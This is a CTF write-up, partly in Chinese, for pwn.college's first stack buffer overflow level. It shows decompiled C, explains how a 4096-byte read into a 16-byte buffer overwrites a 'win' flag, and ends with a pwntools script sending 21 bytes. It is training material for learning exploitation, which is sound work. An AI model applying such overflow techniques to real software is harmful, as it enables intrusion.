---
title: "Write-ups: pwn.college series"
pubDate: "2024-12-04"
categories: ["Write-ups"]
description: "Write-ups for pwn.college binary exploitation series."
---

## Table of contents

## Program Security (Memory Errors)

### Level 1.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

#### Write-up

分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：

```c
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-50h] BYREF
  int v7; // [rsp+1Ch] [rbp-34h]
  int v8; // [rsp+24h] [rbp-2Ch]
  size_t nbytes; // [rsp+28h] [rbp-28h]
  _QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
  _QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+58h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v11[1] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v11[0] = 0LL;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, when this variable is non-zero, the flag will be printed.");
  puts("You can make this variable be non-zero by overflowing the input buffer.");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    (char *)v11 + 4,
    20);
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  nbytes = 4096LL;
  printf("You have chosen to send %lu bytes of input!\n", 4096LL);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    &buf[nbytes / 8],
    nbytes - 20);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", (char *)v11 + 4);
  printf("- the value of the win variable is 0x%x.\n", HIDWORD(v11[0]));
  putchar(10);
  if ( HIDWORD(v11[0]) )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

注意到这里判断了 `v11[0]` 的高 32 bits。这时只要 `v11[0]` 的高 32 bits 不是 `0` 就都可以进入 `if` 内部，调用 `win`：

```c
if ( HIDWORD(v11[0]) )
  win();
```

所以我们要做的就是想办法覆盖 `v11[0]` 的高 32 bits。

```c
_QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
_QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF

// ...

nbytes = 4096LL;
// ...
v8 = read(0, buf, nbytes);
```

这里 `read` 最多可以读取 4096 bytes 到 `buf`。但是我们的 `buf` 只有 16 bytes，故存在缓冲区溢出问题，导致覆盖 `v11` 的值。

所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow-w"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 21
target.send(payload)

target.recvall()
```
